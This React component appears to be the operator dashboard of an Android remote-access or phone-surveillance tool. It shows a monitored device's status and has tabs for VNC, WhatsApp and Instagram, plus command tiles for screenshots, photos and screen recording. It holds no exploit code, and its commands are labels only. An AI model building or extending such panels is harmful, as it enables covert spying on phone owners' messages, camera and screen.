import React, { useEffect, useState } from "react";
import "./style.css";
// import Nav from "../../components/Nav";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import {
  faMobileScreen,
  faFile,
  faVideo,
  faPhotoFilm,
  faFolderOpen,
  faCloudSun,
  faComments,
  faTriangleExclamation,
  faMobileRetro,
  faTerminal,
  faBatteryThreeQuarters,
  faCircleExclamation,
  faCameraRetro,
  faEye,
  faMicrophone,
  faSignal,
  faCamera,
  faCameraRotate,
  faChevronLeft,
  faCircle,
  faSquare,
  faClock,
} from "@fortawesome/free-solid-svg-icons";
import {
  faWhatsapp,
  faConnectdevelop,
} from "@fortawesome/free-brands-svg-icons";
import { useNavigate } from "react-router-dom";
import { faInstagram, faGooglePlay } from "@fortawesome/free-brands-svg-icons";

import Aplication from "./screens/Aplication";
import VirtualNetwork from "./screens/VirtualNetwork";
import Whatsapp from "./screens/Whatssap";
import Instragam from "./screens/Instragam";

function AphoneDetails() {
  const [activeComponent, setActiveComponent] = useState({
    name: "virtualnetwork",
  });
  const [deviceInfo, setDeviceInfo] = useState(null);
  const navigate = useNavigate();

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const id = params.get("id");
    const email = localStorage.getItem("email");

    if (!id || !email) {
      navigate("/");
      return;
    }

    const fetchDevice = () => {
      fetch(
        `https://backend-ryzt.onrender.com/getdevice?email=${encodeURIComponent(
          email
        )}&id=${id}`
      )
        .then((res) => {
          if (!res.ok) throw new Error("Resposta inválida");
          return res.json();
        })
        .then((data) => {
          if (!data || Object.keys(data).length === 0) {
            navigate("/");
          } else {
            setDeviceInfo(data);
          }
        })
        .catch((err) => {
          console.error("Erro ao buscar dispositivo:", err);
          navigate("/");
        });
    };

    fetchDevice();

    const interval = setInterval(fetchDevice, 120000);

    return () => clearInterval(interval);
  }, [activeComponent]);

  return (
    <>
      {/* <Nav /> */}
      <div className="render-Apho">
        <div className="b-effect"></div>
        <div className="header-info">
          <div className="info">
            <FontAwesomeIcon
              icon={faMobileScreen}
              color="#B9B9BB"
              style={{ fontSize: "15px" }}
            />
            <h2>Aphone - {deviceInfo?.device_name || "Loading..."}</h2>
            <div className="line">
              <div className="pont"></div>
              <p>{deviceInfo?.status || "..."}</p>
            </div>
          </div>

          <div className="info">
            <h1 className="a" style={{ border: "none" }}>
              <span>{deviceInfo?.install_date?.split(" ")[0]}</span> - <br />
              {deviceInfo?.last_online || "..."}
            </h1>
          </div>
        </div>

        <div className="header-top">
          <div
            className={`box-hd ${
              activeComponent.name === "mainall" ? "a" : ""
            }`}
            onClick={() => setActiveComponent({ name: "mainall" })}
          >
            <div className="icon">
              <FontAwesomeIcon
                icon={faTerminal}
                color="#B9B9BB"
                style={{ fontSize: "13px" }}
              />
            </div>
            <p>Aphone</p>
          </div>

          <div
            className={`box-hd ${
              activeComponent.name === "r-atividade" ? "a" : ""
            }`}
            onClick={() => setActiveComponent({ name: "r-atividade" })}
          >
            <div className="icon">
              <FontAwesomeIcon
                icon={faMobileRetro}
                color="#B9B9BB"
                style={{ fontSize: "13px" }}
              />
            </div>
            <p>Registro de Atividades</p>
          </div>

          <div
            className={`box-hd ${
              activeComponent.name === "emergencia" ? "a" : ""
            }`}
            onClick={() => setActiveComponent({ name: "emergencia" })}
          >
            <div className="icon">
              <FontAwesomeIcon
                icon={faTriangleExclamation}
                color="#B9B9BB"
                style={{ fontSize: "13px" }}
              />
            </div>
            <p>Emergência</p>
          </div>

          <div
            className={`box-hd ${
              activeComponent.name === "aplication" ? "a" : ""
            }`}
            onClick={() => setActiveComponent({ name: "aplication" })}
          >
            <div className="icon">
              <FontAwesomeIcon
                icon={faFile}
                color="#B9B9BB"
                style={{ fontSize: "13px" }}
              />
            </div>
            <p>Aplicativos</p>
          </div>

          <div
            className={`box-hd ${
              activeComponent.name === "virtualnetwork" ? "a" : ""
            }`}
            onClick={() => setActiveComponent({ name: "virtualnetwork" })}
          >
            <div className="icon">
              <FontAwesomeIcon
                icon={faVideo}
                color="#B9B9BB"
                style={{ fontSize: "13px" }}
              />
            </div>
            <p>VNC</p>
          </div>

          <div
            className={`box-hd ${
              activeComponent.name === "whatsapp" ? "a" : ""
            }`}
            onClick={() => setActiveComponent({ name: "whatsapp" })}
          >
            <div className="icon">
              <FontAwesomeIcon
                icon={faWhatsapp}
                color="#B9B9BB"
                style={{ fontSize: "14px" }}
              />
            </div>
            <p>Whatsapp</p>
          </div>

          <div
            className={`box-hd ${
              activeComponent.name === "instagram" ? "a" : ""
            }`}
            onClick={() => setActiveComponent({ name: "instagram" })}
          >
            <div className="icon">
              <FontAwesomeIcon
                icon={faInstagram}
                color="#B9B9BB"
                style={{ fontSize: "14px" }}
              />
            </div>
            <p>Instagram</p>
          </div>
        </div>

        <>
          {activeComponent.name === "mainall" && (
            <>
              <div className="main-box-all">
                <div className="nav-information">
                  <div className="box-info">
                    <div className="icon">
                      <div className="ic">
                        <FontAwesomeIcon
                          icon={faBatteryThreeQuarters}
                          color="#B9B9BB"
                          style={{ fontSize: "20px" }}
                        />
                      </div>
                    </div>
                    <div className="text-inf">
                      <p>Batery</p>
                      <h1>{`${deviceInfo?.battery}%` || "NULL"}</h1>
                    </div>
                  </div>

                  <div className="box-info">
                    <div className="icon">
                      <div className="ic">
                        <FontAwesomeIcon
                          icon={faCloudSun}
                          color="#B9B9BB"
                          style={{ fontSize: "20px" }}
                        />
                      </div>
                    </div>
                    <div className="text-inf">
                      <p>Cloudy</p>
                      <h1>
                        {deviceInfo?.status === "Offline"
                          ? "Disconnect"
                          : `${deviceInfo?.temperature_celsius}৹C` || "NO INFO"}
                      </h1>
                    </div>
                  </div>

                  <div className="box-info">
                    <div className="icon">
                      <div className="ic">
                        <FontAwesomeIcon
                          icon={faConnectdevelop}
                          color="#B9B9BB"
                          style={{ fontSize: "20px" }}
                        />
                      </div>
                    </div>
                    <div className="text-inf">
                      <p>Connect</p>
                      <h1>{`${deviceInfo?.status}` || "Null"}</h1>
                    </div>
                  </div>

                  <div className="box-info">
                    <div className="icon">
                      <div className="ic">
                        <FontAwesomeIcon
                          icon={faGooglePlay}
                          color="#B9B9BB"
                          style={{ fontSize: "20px", marginLeft: "5px" }}
                        />
                      </div>
                    </div>
                    <div className="text-inf">
                      <p>Last App Open</p>
                      <h1>{`${deviceInfo?.last_app}` || "Null"}</h1>
                    </div>
                  </div>

                  <div className="box-info">
                    <div className="icon">
                      <div className="ic">
                        <FontAwesomeIcon
                          icon={faClock}
                          color="#B9B9BB"
                          style={{ fontSize: "20px", marginLeft: "1px" }}
                        />
                      </div>
                    </div>
                    <div className="text-inf">
                      <p>Time of PowerOn</p>
                      <h1>
                        {deviceInfo?.status === "Offline"
                          ? "Disconnect"
                          : deviceInfo?.uptime_minutes || "Null"}
                      </h1>
                    </div>
                  </div>
                </div>

                <div className="aphone-and-comands">
                  <div className="comands">
                    <div className="main-cmds">
                      <div className="tl">
                        <p>Comands</p>
                        <h1>Permission</h1>
                      </div>

                      <div className="touchs-cmds">
                        <div className="touch">
                          <div className="icon">
                            <FontAwesomeIcon
                              icon={faCircleExclamation}
                              color="#B9B9BB"
                              style={{ fontSize: "1em" }}
                            />
                          </div>
                          <p>DrawOver Apps (REQUIRED)</p>
                        </div>

                        <div className="touch">
                          <div className="icon">
                            <FontAwesomeIcon
                              icon={faEye}
                              color="#B9B9BB"
                              style={{ fontSize: "1em" }}
                            />
                          </div>
                          <p>Background (REQUIRED)</p>
                        </div>

                        <div className="touch">
                          <div className="icon">
                            <FontAwesomeIcon
                              icon={faCameraRetro}
                              color="#B9B9BB"
                              style={{ fontSize: "1em" }}
                            />
                          </div>

                          <div className="icon" style={{ margin: "0px 5px" }}>
                            <FontAwesomeIcon
                              icon={faMicrophone}
                              color="#B9B9BB"
                              style={{ fontSize: "1em" }}
                            />
                          </div>

                          <div className="icon">
                            <FontAwesomeIcon
                              icon={faFolderOpen}
                              color="#B9B9BB"
                              style={{ fontSize: "1em" }}
                            />
                          </div>
                          <p>Outher (REQUIRED)</p>
                        </div>
                      </div>
                    </div>

                    <div className="main-cmds">
                      <div className="tl">
                        <p>Comands</p>
                      </div>

                      <div className="touchs-cmds">
                        <div className="touch">
                          <div className="icon">
                            <FontAwesomeIcon
                              icon={faSignal}
                              color="#B9B9BB"
                              style={{ fontSize: "1em" }}
                            />
                          </div>
                          <p>Reestablish Connection</p>
                        </div>

                        <div className="touch">
                          <div className="icon">
                            <FontAwesomeIcon
                              icon={faSignal}
                              color="#B9B9BB"
                              style={{ fontSize: "1em" }}
                            />
                          </div>
                          <p>Take Screenshot</p>
                        </div>

                        <div className="touch">
                          <div className="icon">
                            <FontAwesomeIcon
                              icon={faCamera}
                              color="#B9B9BB"
                              style={{ fontSize: "1em" }}
                            />
                          </div>
                          <p>Take Photo</p>
                        </div>

                        <div className="touch">
                          <div className="icon">
                            <FontAwesomeIcon
                              icon={faCameraRotate}
                              color="#B9B9BB"
                              style={{ fontSize: "1em" }}
                            />
                          </div>
                          <p>Take Photo</p>
                        </div>

                        <div className="touch">
                          <div className="icon">
                            <FontAwesomeIcon
                              icon={faVideo}
                              color="#B9B9BB"
                              style={{ fontSize: "1em" }}
                            />
                          </div>
                          <p>Record Screen</p>
                        </div>

                        <div className="touch">
                          <div className="icon">
                            <FontAwesomeIcon
                              icon={faChevronLeft}
                              color="#B9B9BB"
                              style={{ fontSize: "0.7em" }}
                            />
                          </div>
                        </div>

                        <div className="touch">
                          <div className="icon">
                            <FontAwesomeIcon
                              icon={faCircle}
                              color="#B9B9BB"
                              style={{ fontSize: "0.7em" }}
                            />
                          </div>
                        </div>

                        <div className="touch">
                          <div className="icon">
                            <FontAwesomeIcon
                              icon={faSquare}
                              color="#B9B9BB"
                              style={{ fontSize: "0.7em" }}
                            />
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="aphone">
                    <p>No Logs Information</p>
                  </div>
                </div>
              </div>
            </>
          )}
          {activeComponent.name === "aplication" && <Aplication />}
          {activeComponent.name === "virtualnetwork" && <VirtualNetwork />}
          {activeComponent.name === "whatsapp" && <Whatsapp />}
          {activeComponent.name === "instagram" && <Instragam />}
        </>
      </div>
    </>
  );
}

export default AphoneDetails;
